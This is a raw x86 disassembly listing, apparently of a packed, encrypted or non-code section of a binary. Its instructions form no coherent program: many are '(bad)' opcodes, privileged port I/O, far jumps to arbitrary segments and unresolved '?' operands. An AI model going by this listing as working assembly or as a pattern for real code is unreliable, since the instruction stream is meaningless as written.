  410b50:	scas   al,BYTE PTR es:[edi]
  410b51:	mov    ch,0xaf
  410b53:	or     BYTE PTR [eax],0x5c
  410b56:	jle    0x410bb7
  410b58:	repz test BYTE PTR fs:[ebp+ebp*2+0x4b],0x9e
  410b5f:	fcomip st,st(5)
  410b61:	mov    BYTE PTR [ebx+ebx*2],dl
  410b64:	or     BYTE PTR [esi],al
  410b66:	adc    dl,bl
  410b68:	cwde   
  410b69:	jns    0x410b63
  410b6b:	mov    cl,0xad
  410b6d:	push   edi
  410b6e:	cmp    al,0xe
  410b70:	or     edi,0x294c1947
  410b76:	shl    BYTE PTR [ecx+0x61bf1993],1
  410b7c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410b7d:	loopne 0x410bd2
  410b7f:	jecxz  0x410b05
  410b81:	stos   DWORD PTR es:[edi],eax
  410b82:	repnz cmp al,0xb5
  410b85:	lock jbe 0x410b88
  410b88:	inc    ebp
  410b89:	add    ebp,esi
  410b8b:	fst    QWORD PTR [edx+0x54]
  410b8e:	push   0xffffffa4
  410b90:	daa    
  410b91:	enter  0x39cc,0x0
  410b95:	dec    esi
  410b96:	repnz dec ebx
  410b98:	jmp    0x410b52
  410b9a:	imul   ebx,esi,0x9a17446
  410ba0:	sbb    DWORD PTR [esi],ebx
  410ba2:	ds (bad) 
  410ba4:	out    0x54,al
  410ba6:	or     ah,cl
  410ba8:	loopne 0x410b65
  410baa:	loop   0x410be3
  410bac:	(bad)  
  410bad:	test   BYTE PTR [edi-0x78],0x56
  410bb1:	xchg   esi,eax
  410bb2:	sbb    ch,BYTE PTR [eax]
  410bb4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410bb5:	mov    ds:0xaf6398d9,eax
  410bba:	js     0x410bf6
  410bbc:	pop    ebx
  410bbd:	bound  edi,QWORD PTR [edi+0x3a3a2046]
  410bc3:	pop    esi
  410bc4:	mov    al,0xb8
  410bc6:	adc    BYTE PTR [edi+0x7],ch
  410bc9:	sahf   
  410bca:	test   BYTE PTR [edi+0x6],0xb
  410bce:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410bcf:	pop    edi
  410bd0:	jns    0x410b82
  410bd2:	pop    esp
  410bd3:	add    DWORD PTR [edi+edi*4],0x2b
  410bd7:	ret    
  410bd8:	xchg   al,dh
  410bda:	push   ebp
  410bdb:	jno    0x410c1b
  410bdd:	scas   eax,DWORD PTR es:[edi]
  410bde:	push   eax
  410bdf:	cmc    
  410be0:	and    bl,BYTE PTR [ebp+0x57]
  410be3:	mov    WORD PTR [ecx+esi*1],ss
  410be6:	adc    al,0x94
  410be8:	mov    bh,0x7f
  410bea:	(bad)  
  410beb:	leave  
  410bec:	pop    edi
  410bed:	lahf   
  410bee:	jle    0x410c49
  410bf0:	push   ss
  410bf1:	lock scas eax,DWORD PTR es:[edi]
  410bf3:	xchg   ecx,eax
  410bf4:	pop    es
  410bf5:	mov    ebx,0xd15def12
  410bfa:	mov    al,ds:0xa52621da
  410bff:	adc    bh,BYTE PTR [ebp-0x11]
  410c02:	xchg   ebp,eax
  410c03:	aam    0x9f
  410c05:	cmp    ah,BYTE PTR [esi]
  410c07:	test   al,0x25
  410c09:	js     0x410b8b
  410c0b:	pop    esi
  410c0c:	popf   
  410c0d:	dec    edx
  410c0e:	or     DWORD PTR [ecx+0x56b26ff2],0xffffff90
  410c15:	push   cs
  410c16:	inc    ebp
  410c17:	out    0x1d,eax
  410c19:	jae    0x410c11
  410c1b:	dec    ebp
  410c1c:	jmp    0xccaf:0x19e3f077
  410c23:	cwde   
  410c24:	mov    eax,0xda6540e1
  410c29:	jno    0x410c92
  410c2b:	repz cli 
  410c2d:	push   cs
  410c2e:	adc    eax,0xc4cc4fda
  410c33:	xor    eax,0x378c4179
  410c38:	mov    bl,0x6
  410c3a:	mov    esi,0x462e8f2e
  410c3f:	aam    0xda
  410c41:	sbb    cl,BYTE PTR [edx]
  410c43:	outs   dx,DWORD PTR ds:[esi]
  410c44:	inc    esi
  410c45:	xlat   BYTE PTR ds:[ebx]
  410c46:	mov    DWORD PTR [ebx-0x4b610a51],0xd8b1f35c
  410c50:	scas   al,BYTE PTR es:[edi]
  410c51:	or     cl,bh
  410c53:	adc    BYTE PTR [edi+0xffbc8a6],bl
  410c59:	and    eax,DWORD PTR [edi+edx*2+0xa1b1b78]
  410c60:	pop    ebp
  410c61:	loop   0x410c9c
  410c63:	jl     0x410c84
  410c65:	test   eax,0x8cf28433
  410c6a:	push   0x41946a75
  410c6f:	rcr    DWORD PTR [edx+0x2e482007],1
  410c75:	test   DWORD PTR [ebx+0xc],ebp
  410c78:	sbb    dh,bl
  410c7a:	loop   0x410c24
  410c7c:	outs   dx,DWORD PTR ds:[esi]
  410c7d:	dec    esp
  410c7e:	fnsave [ecx+eiz*1+0x3d]
  410c82:	mov    esp,0x47f60a18
  410c87:	xor    eax,0x99ad1641
  410c8c:	xchg   ebp,eax
  410c8d:	adc    ebx,DWORD PTR [ecx+eiz*4+0x32b206f1]
  410c94:	sub    al,0xf6
  410c96:	fisub  WORD PTR [esi-0xef93652]
  410c9c:	out    0x36,al
  410c9e:	mov    dl,0x22
  410ca0:	loop   0x410c47
  410ca2:	inc    edx
  410ca3:	pop    edx
  410ca4:	add    BYTE PTR [edi+0x53],0xa
  410ca8:	pop    ecx
  410ca9:	arpl   WORD PTR [edx+0x6da4a942],dx
  410caf:	inc    ecx
  410cb0:	shl    DWORD PTR [edx],0x75
  410cb3:	in     eax,0x33
  410cb5:	outs   dx,BYTE PTR ds:[esi]
  410cb6:	push   edi
  410cb7:	add    al,0x8f
  410cb9:	frstor ds:0x4deec3d2
  410cbf:	loopne 0x410c72
  410cc1:	sub    al,0xf5
  410cc3:	stos   DWORD PTR es:[edi],eax
  410cc4:	bound  esi,QWORD PTR [esi-0x29]
  410cc7:	lea    ebp,[ecx-0x2c]
  410cca:	mov    cl,0x76
  410ccc:	sbb    DWORD PTR [ebp+0x130ae598],esp
  410cd2:	pop    eax
  410cd3:	in     al,0xa6
  410cd5:	out    0x86,eax
  410cd7:	lds    edx,FWORD PTR [esp+ecx*4-0x7c]
  410cdb:	(bad)  
  410cdc:	retf   
  410cdd:	sub    BYTE PTR [eax],al
  410cdf:	lea    esi,[ebx-0x53]
  410ce2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410ce3:	imul   esp,ecx,0x4629eda0
  410ce9:	nop
  410cea:	out    0x6b,eax
  410cec:	adc    al,ah
  410cee:	rol    BYTE PTR ds:0x76ed0e43,0x2
  410cf5:	into   
  410cf6:	sbb    bl,dl
  410cf8:	imul   ebp,DWORD PTR [ebx-0x56d7222],0x7b
  410cff:	out    dx,eax
  410d00:	mov    eax,ds:0x318f411d
  410d05:	stos   BYTE PTR es:[edi],al
  410d06:	xor    eax,0x3d
  410d09:	cmc    
  410d0a:	shr    DWORD PTR [ecx],cl
  410d0c:	jecxz  0x410d7c
  410d0e:	jmp    0x410d79
  410d10:	rcr    BYTE PTR [edx+ebp*8+0x3c],1
  410d14:	loop   0x410d42
  410d16:	and    al,BYTE PTR [esi]
  410d18:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410d19:	inc    edx
  410d1a:	jne    0x410cda
  410d1c:	mov    ebx,0xa44c429a
  410d21:	test   al,0x85
  410d23:	loope  0x410d3d
  410d25:	out    dx,al
  410d26:	mov    ecx,0xac74e287
  410d2b:	arpl   WORD PTR [edx-0xaae842b],cx
  410d31:	cdq    
  410d32:	mov    ebx,0xe07ea6d6
  410d37:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410d38:	imul   DWORD PTR [ecx-0xca396e7]
  410d3e:	xchg   edx,eax
  410d3f:	cmp    ch,BYTE PTR [edx]
  410d41:	fcmovnu st,st(6)
  410d43:	or     ebp,DWORD PTR [eax-0xf40e139]
  410d49:	fstp   DWORD PTR [esi+0x3d545097]
  410d4f:	ss inc ebx
  410d51:	sub    cl,BYTE PTR [edx-0x55]
  410d54:	pushf  
  410d55:	int    0xc8
  410d57:	xchg   DWORD PTR [ecx-0x3a1b7a93],edi
  410d5d:	mov    WORD PTR [ebp-0x2c516cef],ss
  410d63:	mov    ecx,0x3e2486af
  410d68:	jmp    0x43ad3c10
  410d6d:	ss push ss
  410d6f:	cmp    ebx,DWORD PTR [edi-0x61]
  410d72:	in     eax,dx
  410d73:	xchg   ebp,eax
  410d74:	out    0x56,al
  410d76:	jnp    0x410dbf
  410d78:	fst    st(0)
  410d7a:	sub    eax,0x1ac1d5e2
  410d7f:	cmp    dh,BYTE PTR [ecx+esi*1+0x50]
  410d83:	in     al,0x18
  410d85:	push   ss
  410d86:	hlt    
  410d87:	xchg   esi,eax
  410d88:	repnz inc ebx
  410d8a:	sti    
  410d8b:	int3   
  410d8c:	fsub   QWORD PTR [ecx]
  410d8e:	pop    ecx
  410d8f:	pcmpeqb mm7,QWORD PTR [edx-0x6b]
  410d93:	dec    esi
  410d94:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410d95:	pop    es
  410d96:	cmp    eax,0x3a42ebc5
  410d9b:	nop
  410d9c:	add    eax,0x4e857287
  410da1:	jmp    0x410d29
  410da3:	std    
  410da4:	call   0x1adc:0x8c52c083
  410dab:	cmp    BYTE PTR [ecx],bl
  410dad:	cmp    ah,dh
  410daf:	jecxz  0x410e18
  410db1:	dec    esp
  410db2:	enter  0x5caf,0xf7
  410db6:	mul    ch
  410db8:	test   al,0xdc
  410dba:	pop    ss
  410dbb:	push   esp
  410dbc:	sub    DWORD PTR [esi-0x5f],ecx
  410dbf:	(bad)  [ebx-0x640e410e]
  410dc5:	repz das 
  410dc7:	popf   
  410dc8:	cwde   
  410dc9:	sar    DWORD PTR [edi],1
  410dcb:	adc    edx,DWORD PTR ds:[edx+0x406d10a0]
  410dd2:	dec    eax
  410dd3:	jle    0x410d7d
  410dd5:	imul   ebx,eax,0xf8db8183
  410ddb:	leave  
  410ddc:	mov    esi,0xc51ac053
  410de1:	fldcw  WORD PTR [ecx]
  410de3:	das    
  410de4:	dec    esi
  410de5:	outs   dx,BYTE PTR ds:[esi]
  410de6:	push   eax
  410de7:	push   es
  410de8:	adc    BYTE PTR [ecx+0x7bfc3e70],0x7d
  410def:	mov    eax,0xbb53e755
  410df4:	clc    
  410df5:	xor    BYTE PTR [ecx],al
  410df7:	or     DWORD PTR [edi-0x62],0x7c
  410dfb:	xor    bl,dh
  410dfd:	test   BYTE PTR [ecx],dl
  410dff:	cli    
  410e00:	ficom  DWORD PTR [edi-0xda02663]
  410e06:	and    BYTE PTR [edx],ch
  410e08:	outs   dx,BYTE PTR cs:[esi]
  410e0a:	jecxz  0x410dd9
  410e0c:	or     eax,0x9c2bebb2
  410e11:	das    
  410e12:	pop    ebx
  410e13:	lds    eax,FWORD PTR [ebp-0x19]
  410e16:	cmc    
  410e17:	jl     0x410e95
  410e19:	aam    0x50
  410e1b:	dec    edx
  410e1c:	nop
  410e1d:	or     ax,0x3a58
  410e21:	cmc    
  410e22:	sbb    eax,0xcccaef0
  410e27:	sub    DWORD PTR [edx-0x16],esp
  410e2a:	pop    esp
  410e2b:	inc    edi
  410e2c:	inc    ebp
  410e2d:	push   esi
  410e2e:	pop    ebx
  410e2f:	ds ss push ebp
  410e32:	mov    ch,0xd7
  410e34:	div    DWORD PTR [esi]
  410e36:	cmp    DWORD PTR [esi-0xce9292f],edi
  410e3c:	test   al,0xc9
  410e3e:	outs   dx,DWORD PTR ds:[esi]
  410e3f:	mov    bl,BYTE PTR [edx-0x14]
  410e42:	int    0xf7
  410e44:	xchg   BYTE PTR ds:0x58d16075,ah
  410e4a:	add    ch,al
  410e4c:	push   esi
  410e4d:	jns    0x410e7a
  410e4f:	test   al,0x84
  410e51:	jne    0x410de9
  410e53:	aas    
  410e54:	add    eax,DWORD PTR [eax+0x7e]
  410e57:	add    ebx,esp
  410e59:	and    bh,bh
  410e5b:	lock popf 
  410e5d:	scas   al,BYTE PTR es:[edi]
  410e5e:	shr    BYTE PTR [edx+eiz*2-0x66ed041],0x95
  410e66:	mov    al,0xd4
  410e68:	int3   
  410e69:	dec    edi
  410e6a:	add    BYTE PTR [edi],cl
  410e6c:	adc    edx,DWORD PTR [esi]
  410e6e:	imul   esp,eax,0x48
  410e71:	clc    
  410e72:	xor    esi,DWORD PTR [eax+0x23]
  410e75:	mov    edx,0x7839e0cd
  410e7a:	icebp  
  410e7b:	in     al,dx
  410e7c:	icebp  
  410e7d:	mov    esp,0x5e912ea0
  410e82:	loopne 0x410e1f
  410e84:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410e85:	stos   DWORD PTR es:[edi],eax
  410e86:	pop    es
  410e87:	dec    edx
  410e88:	lea    edi,[ebx-0x78e3479b]
  410e8e:	push   ebx
  410e8f:	fist   WORD PTR [edx]
  410e91:	ret    
  410e92:	(bad)  
  410e93:	fisubr DWORD PTR [edx]
  410e95:	retf   
  410e96:	fucompp 
  410e98:	push   0xffffffc1
  410e9a:	test   eax,0x2da5a583
  410ea0:	mov    cl,0x1
  410ea2:	stc    
  410ea3:	push   cs
  410ea4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410ea5:	es into 
  410ea7:	shl    BYTE PTR [ebp+edi*2+0x62],1
  410eab:	sbb    eax,0x8272c802
  410eb0:	icebp  
  410eb1:	lods   eax,DWORD PTR ds:[esi]
  410eb2:	xchg   edx,eax
  410eb3:	sti    
  410eb4:	pop    edx
  410eb5:	call   0x1b149b5a
  410eba:	adc    BYTE PTR [eax],cl
  410ebc:	mov    esi,0xcbb273c4
  410ec1:	pop    esi
  410ec2:	(bad)  
  410ec3:	(bad)  
  410ec4:	mov    ebp,0x483e8ba
  410ec9:	sub    DWORD PTR [ebx+0x65e0296b],ebp
  410ecf:	jl     0x410ecd
  410ed1:	pop    ecx
  410ed2:	scas   al,BYTE PTR es:[di]
  410ed4:	xor    eax,0xeb64529b
  410ed9:	pop    edi
  410eda:	(bad)  
  410edb:	xchg   DWORD PTR [edx+eax*1-0x5a310f53],esp
  410ee2:	out    dx,al
  410ee3:	push   esp
  410ee4:	dec    ebx
  410ee5:	iret   
  410ee6:	pop    es
  410ee7:	enter  0x712e,0xe2
  410eeb:	call   0xb7b31b13
  410ef0:	mov    dh,0x55
  410ef2:	cs jbe 0x410e7e
  410ef5:	cli    
  410ef6:	inc    edx
  410ef7:	iret   
  410ef8:	jge    0x410eef
  410efa:	mov    ah,0xf0
  410efc:	mov    ebx,?
  410efe:	ins    BYTE PTR es:[edi],dx
  410eff:	cmp    BYTE PTR [edi],dh
  410f01:	fdivr  QWORD PTR [esi+0xd]
  410f04:	sbb    DWORD PTR [edi],ecx
  410f06:	jg     0x410ea9
  410f08:	jnp    0x410efd
  410f0a:	mov    esi,DWORD PTR es:[ecx+edi*8-0x1f]
  410f0f:	jno    0x410ee5
  410f11:	icebp  
  410f12:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410f13:	fs pop eax
  410f15:	pop    ds
  410f16:	int3   
  410f17:	xacquire xchg DWORD PTR [edi+0x2e],ebp
  410f1b:	das    
  410f1c:	es in  al,dx
  410f1e:	dec    edx
  410f1f:	gs inc ebx
  410f21:	inc    ebp
  410f22:	pop    edx
  410f23:	add    DWORD PTR [esi-0x7f],esp
  410f26:	mov    ?,edi
  410f28:	pop    ebx
  410f29:	or     ebx,ebx
  410f2b:	push   ebx
  410f2c:	imul   esi,DWORD PTR [ebx+0x5c],0x1
  410f30:	shr    DWORD PTR [edx+0x79b138a0],cl
  410f36:	add    al,0xfe
  410f38:	inc    esp
  410f39:	or     DWORD PTR [edx],ebx
  410f3b:	mov    ch,0xf5
  410f3d:	enter  0x2185,0xe
  410f41:	inc    esi
  410f42:	mov    al,ds:0xa8b0f26
  410f47:	pop    ecx
  410f48:	mov    ecx,0xac84fc16
  410f4d:	adc    BYTE PTR [edi-0x80],al
  410f50:	xor    al,BYTE PTR [ecx]
  410f52:	fwait
  410f53:	sbb    BYTE PTR [ebx+0x65],dl
  410f56:	bound  edi,QWORD PTR [ebx]
  410f58:	scas   eax,DWORD PTR es:[edi]
  410f59:	push   ss
  410f5a:	int3   
  410f5b:	loope  0x410fc0
  410f5d:	add    dh,BYTE PTR [ecx+0x32]
  410f60:	je     0x410eff
  410f62:	jno    0x410f80
  410f64:	mov    ch,0x82
  410f66:	sbb    ah,BYTE PTR [edx]
  410f68:	repz in al,dx
  410f6a:	jb     0x410f64
  410f6c:	outs   dx,BYTE PTR ds:[esi]
  410f6d:	mov    esi,esp
  410f6f:	inc    esp
  410f70:	loope  0x410f8e
  410f72:	or     BYTE PTR ds:[edx+0x18595a10],ch
  410f79:	lods   al,BYTE PTR ds:[esi]
  410f7a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410f7b:	out    0x1f,eax
  410f7d:	fnstcw WORD PTR gs:0xfbf84678
  410f84:	pop    eax
  410f85:	pushf  
  410f86:	mov    ds:0xa33426a0,eax
  410f8b:	push   esi
  410f8c:	(bad)  
  410f8d:	pop    edi
  410f8e:	ss (bad) 
  410f90:	out    0x3f,eax
  410f92:	call   0x20324f5b
  410f97:	jg     0x410f84
  410f99:	cwde   
  410f9a:	jge    0x410f8c
  410f9c:	mov    cl,0x1b
  410f9e:	jecxz  0x410fe9
  410fa0:	rcr    DWORD PTR [ebp-0x67],1
  410fa3:	lods   eax,DWORD PTR ds:[esi]
  410fa4:	rol    DWORD PTR [eax],cl
  410fa6:	push   0x443bcf05
  410fab:	jno    0x410f80
  410fad:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410fae:	mov    edx,ebp
  410fb0:	mov    eax,fs:0x2ccc2e2f
  410fb6:	pop    esi
  410fb7:	in     al,dx
  410fb8:	sub    ecx,0x44970649
  410fbe:	lds    ebx,FWORD PTR [edx-0x2a1f3157]
  410fc4:	fwait
  410fc5:	cmp    edx,edi
  410fc7:	add    ebp,DWORD PTR [eax+0x52]
  410fca:	out    0x7e,eax
  410fcc:	push   esp
  410fcd:	scas   al,BYTE PTR es:[edi]
  410fce:	xor    BYTE PTR [edi+ebx*8+0x3443854c],0x4c
  410fd6:	lahf   
  410fd7:	jmp    0x411004
  410fd9:	ins    BYTE PTR es:[edi],dx
  410fda:	and    BYTE PTR [ecx-0x7156cb28],al
  410fe0:	test   DWORD PTR [edi+0x3b],ecx
  410fe3:	popf   
  410fe4:	pop    ebp
  410fe5:	leave  
  410fe6:	mov    ds:0x8f908c67,al
  410feb:	iret   
  410fec:	ins    BYTE PTR es:[edi],dx
  410fed:	mov    ch,0xb2
  410fef:	jmp    0x2b0c9250
  410ff4:	imul   dl
  410ff6:	cmp    DWORD PTR [edi+eax*4+0x300a8cb2],eax
  410ffd:	push   ebx
  410ffe:	xchg   edi,eax
  410fff:	jbe    0x410f9d
  411001:	(bad)  
  411002:	mov    ebx,0x8cf6264f
  411007:	ins    BYTE PTR es:[edi],dx
  411008:	or     DWORD PTR [ecx+0x53],esp
  41100b:	in     al,0x10
  41100d:	pop    ecx
  41100e:	sub    al,0x8d
  411010:	call   0x7304:0xd30b7473
  411017:	xchg   ebx,eax
  411018:	inc    ebp
  411019:	xchg   ebx,eax
  41101a:	push   0x2d
  41101c:	xor    ebp,DWORD PTR [esi]
  41101e:	jbe    0x410fbc
  411020:	popf   
  411021:	adc    DWORD PTR [edx-0x54787b18],ebp
  411027:	dec    edi
  411028:	ja     0x410ff9
  41102a:	or     BYTE PTR [edi+0x29],bh
  41102d:	mov    al,ds:0x9286b8ba
  411032:	ret    0x8ab3
  411035:	ret    0x9088
  411038:	push   ebp
  411039:	mov    dl,BYTE PTR [ebx]
  41103b:	xchg   edi,eax
  41103c:	js     0x4110a3
  41103e:	sahf   
  41103f:	hlt    
  411040:	(bad)  
  411041:	cmp    DWORD PTR [esi-0x34],edi
  411044:	mov    cl,0xee
  411046:	es jmp 0x411040
  411049:	imul   esp,DWORD PTR [ebp+0x5737253],0x66
  411050:	ja     0x41107a
  411052:	and    edx,DWORD PTR fs:[ebx-0x76b5ec7a]
  411059:	arpl   bx,si
  41105b:	pop    ebx
  41105c:	shl    DWORD PTR [ecx],0x3
  41105f:	jo     0x410fff
  411061:	pop    esp
  411062:	and    al,0x5d
  411064:	adc    eax,0x2a599e2b
  411069:	mov    ebx,esi
  41106b:	jle    0x411021
  41106d:	cdq    
  41106e:	dec    esi
  41106f:	pop    DWORD PTR [eax]
  411071:	dec    eax
  411072:	std    
  411073:	pop    ss
  411074:	lock sub al,0x57
  411077:	lahf   
  411078:	inc    ebp
  411079:	les    esi,FWORD PTR [edi+0x78]
  41107c:	jno    0x41105d
  41107e:	mov    al,ds:0x8e40b142
  411083:	gs adc eax,0x88ab1f3a
  411089:	push   ds
  41108a:	inc    ecx
  41108b:	int    0x65
  41108d:	cmp    BYTE PTR [eax+0x76],dh
  411090:	fcom   DWORD PTR [edx-0x44]
  411093:	les    esp,FWORD PTR [ebx-0x6bddd25f]
  411099:	mov    eax,0xb07c1652
  41109e:	ret    
  41109f:	(bad)  
  4110a0:	mov    ah,0x4f
  4110a2:	in     al,dx
  4110a3:	jo     0x41107c
  4110a5:	(bad)  
  4110a6:	jmp    0xc882:0x5ce307f9
  4110ad:	push   edx
  4110ae:	jp     0x4110bd
  4110b0:	xchg   esi,ecx
  4110b2:	xor    DWORD PTR [eax-0x77c96b5d],esp
  4110b8:	outs   dx,BYTE PTR ds:[esi]
  4110b9:	ficomp DWORD PTR ds:0x32e41b47
  4110bf:	in     eax,dx
  4110c0:	xor    dh,BYTE PTR [ebp+eax*4-0x6a]
  4110c4:	fs ins DWORD PTR es:[edi],dx
  4110c6:	adc    al,0xd9
  4110c8:	mov    WORD PTR [ebp+edx*1-0x34],fs
  4110cc:	ins    BYTE PTR es:[edi],dx
  4110cd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4110ce:	mov    edx,0x87d5c803
  4110d3:	test   eax,0xc0155b7c
  4110d8:	repnz mov esp,0x3f9aebad
  4110de:	dec    edx
  4110df:	xchg   esi,eax
  4110e0:	jno    0x41111b
  4110e2:	sbb    DWORD PTR [ebx-0x1b614e27],esp
  4110e8:	or     esi,DWORD PTR [esi+0x57]
  4110eb:	jge    0x41110a
  4110ed:	dec    edx
  4110ee:	popa   
  4110ef:	and    BYTE PTR [ebx-0x3c],ah
  4110f2:	jle    0x41114d
  4110f4:	outs   dx,DWORD PTR ds:[esi]
  4110f5:	out    0x7c,al
  4110f7:	mov    ch,ch
  4110f9:	rol    BYTE PTR [edi],cl
  4110fb:	mov    ecx,0x809649fb
  411100:	push   0x5a
  411102:	lods   al,BYTE PTR ds:[esi]
  411103:	push   ds
  411104:	inc    esp
  411105:	repz in eax,dx
  411107:	mov    DWORD PTR [esi+edx*4-0x68fc006f],esp
  41110e:	jbe    0x41113f
  411110:	retf   
  411111:	or     BYTE PTR ds:0xfeac2a92,ah
  411117:	(bad)  
  411118:	jmp    0x5a0:0xb1ca8749
  41111f:	cmp    eax,0xeac43853
  411124:	mov    ebp,0x92d72032
  411129:	mov    ds:0xa0440f8,eax
  41112e:	pop    ebx
  41112f:	in     al,dx
  411130:	pop    es
  411131:	test   eax,0xaee7d7dd
  411136:	das    
  411137:	mov    dh,0x49
  411139:	jo     0x9c4f567
  41113f:	imul   BYTE PTR [esi+ebx*1]
  411142:	add    al,0xa0
  411144:	daa    
  411145:	in     eax,dx
  411146:	movsx  ebp,WORD PTR [edx+0x4f1352f4]
  41114d:	xchg   esi,eax
  41114e:	sub    ah,BYTE PTR [eax-0x2f]
  411151:	nop
  411152:	cld    
  411153:	or     DWORD PTR [ecx+edi*2-0x9],esi
  411157:	cwde   
  411158:	js     0x4111a7
  41115a:	out    0x59,eax
  41115c:	jecxz  0x4111c6
  41115e:	jns    0x4111a0
  411160:	retf   
  411161:	pop    edi
  411162:	jns    0x411196
  411164:	test   eax,0x71ce4d95
  411169:	(bad)  
  41116a:	ja     0x411179
  41116c:	ror    ebx,cl
  41116e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41116f:	popf   
  411170:	mov    ds:0xbf97b112,eax
  411175:	cmp    eax,0xa1e7a81d
  41117a:	(bad)  
  41117b:	sub    al,ah
  41117d:	inc    BYTE PTR [edx-0x3bc3bc76]
  411183:	neg    BYTE PTR [edx+0x18c4c0b9]
  411189:	retf   
  41118a:	cmp    ebx,DWORD PTR [edx-0x48]
  41118d:	stos   BYTE PTR es:[edi],al
  41118e:	push   eax
  41118f:	out    dx,al
  411190:	cmp    BYTE PTR [edx-0x4c5d04b],0x55
  411197:	loopne 0x411146
  411199:	repnz and eax,0x6515809
  41119f:	pop    ss
  4111a0:	mov    dl,0x83
  4111a2:	pmaxsw mm7,QWORD PTR [eax+0xda4603c]
  4111a9:	test   eax,0x6bf7600e
  4111ae:	sbb    eax,0xf5f06529
  4111b3:	popa   
  4111b4:	push   ecx
  4111b5:	out    dx,eax
  4111b6:	pop    edi
  4111b7:	lahf   
  4111b8:	jl     0x41113b
  4111ba:	and    eax,0xf26f5781
  4111bf:	or     DWORD PTR [edx+ebp*4-0x23],ebx
  4111c3:	lahf   
  4111c4:	sub    eax,0xd80f3e96
  4111c9:	mov    WORD PTR [eax-0x5bf4a74c],cs
  4111cf:	pop    edi
  4111d0:	pop    edi
  4111d1:	sub    DWORD PTR [esi-0x510fa617],esi
  4111d7:	pushf  
  4111d8:	repz sub BYTE PTR [ecx],bl
  4111db:	jb     0x4111db
  4111dd:	pop    es
  4111de:	add    al,0x8a
  4111e0:	mov    ecx,0x75404a1c
  4111e5:	jge    0x411200
  4111e7:	test   BYTE PTR [edi-0x62777c16],ah
  4111ed:	jno    0x41118b
  4111ef:	pusha  
  4111f0:	bound  eax,QWORD PTR [ebx]
  4111f2:	int3   
  4111f3:	lea    esp,[ebp-0x4b5ff4a7]
  4111f9:	inc    ecx
  4111fa:	pop    ss
  4111fb:	xor    DWORD PTR ds:0xdf9bb44f,esi
  411201:	mov    ds:0xb101b122,al
  411206:	or     al,0xf2
  411208:	push   ss
  411209:	adc    ebp,DWORD PTR ds:0xb98aabda
  41120f:	stos   DWORD PTR es:[edi],eax
  411210:	je     0x4111b6
  411212:	iret   
  411213:	daa    
  411214:	pop    edi
  411215:	stos   BYTE PTR es:[edi],al
  411216:	mov    ds:0xdce17b89,eax
  41121b:	leave  
  41121c:	les    esp,FWORD PTR [ebx]
  41121e:	movs   BYTE PTR es:[edi],BYTE PTR fs:[esi]
  411220:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411221:	les    edx,FWORD PTR [ebp-0x41]
  411224:	inc    eax
  411225:	call   0xdee:0x550577b5
  41122c:	das    
  41122d:	mov    cl,0x51
  41122f:	add    ah,BYTE PTR [eax-0x22]
  411232:	dec    edx
  411233:	sub    al,0x70
  411235:	ss pushf 
  411237:	sbb    esi,DWORD PTR [edi-0x62378822]
  41123d:	xor    edx,DWORD PTR [edi-0x34bbdcd6]
  411243:	xchg   ecx,eax
  411244:	pop    esi
  411245:	xor    eax,0x17f062f1
  41124a:	mov    dl,0xf0
  41124c:	mov    edi,0xffffa274
  411251:	sub    al,0xfb
  411254:	mov    bl,0xf7
  411256:	push   edi
  411257:	cli    
  411258:	scas   al,BYTE PTR es:[edi]
  411259:	push   es
  41125a:	ret    0x475f
  41125d:	or     eax,0x9471ac44
  411262:	mov    WORD PTR [edi-0x72ba18dd],gs
  411268:	and    eax,0x34d796aa
  41126d:	test   BYTE PTR [eax+esi*2],al
  411270:	xchg   esp,eax
  411271:	js     0x4112df
  411273:	inc    edx
  411274:	dec    esp
  411275:	jle    0x411253
  411277:	cmp    DWORD PTR [edi-0x73e2d389],eax
  41127d:	and    al,0xd
  41127f:	in     eax,0x4c
  411281:	jl     0x411208
  411283:	and    DWORD PTR [edx+eiz*4+0x258d0104],eax
  41128a:	pop    es
  41128b:	sub    dl,bh
  41128d:	aas    
  41128e:	out    0x41,eax
  411290:	inc    ebp
  411291:	cmp    eax,0x9a31b16a
  411296:	cld    
  411297:	dec    ecx
  411298:	xchg   DWORD PTR ds:0xea00ff75,esp
  41129e:	sub    ebx,esp
  4112a0:	push   esp
  4112a1:	sub    al,0xa2
  4112a3:	push   edx
  4112a4:	sbb    dh,cl
  4112a6:	fisub  DWORD PTR [edx-0x785be7e3]
  4112ac:	std    
  4112ad:	push   ss
  4112ae:	test   BYTE PTR [ebp-0x8481ccc],0xd8
  4112b5:	js     0x411284
  4112b7:	xor    BYTE PTR [eax+edx*4],dh
  4112ba:	or     bh,dl
  4112bc:	imul   ebp,DWORD PTR [ecx],0x2ad7a06d
  4112c2:	sub    eax,0xabc717a1
  4112c7:	adc    DWORD PTR [edx+0x18],edx
  4112ca:	adc    eax,0xa6b921f2
  4112cf:	jecxz  0x411288
  4112d1:	sbb    ebx,esi
  4112d3:	repz dec ecx
  4112d5:	cld    
  4112d6:	add    ecx,DWORD PTR [ebx-0x4a70d6a1]
  4112dc:	push   esp
  4112dd:	xor    DWORD PTR [ebx-0x63cf726],esp
  4112e3:	mov    al,0x95
  4112e5:	push   0xffffffcf
  4112e7:	xchg   edi,esp
  4112e9:	std    
  4112ea:	push   ss
  4112eb:	sub    cl,bl
  4112ed:	scas   eax,DWORD PTR es:[edi]
  4112ee:	mov    esp,0x5716122
  4112f3:	mov    edx,0x579ad12e
  4112f8:	push   es
  4112f9:	inc    ebp
  4112fa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4112fb:	jne    0x411333
  4112fd:	in     eax,dx
  4112fe:	mov    bh,0x26
  411300:	cli    
  411301:	jo     0x4112c0
  411303:	cwde   
  411304:	jle    0x41133a
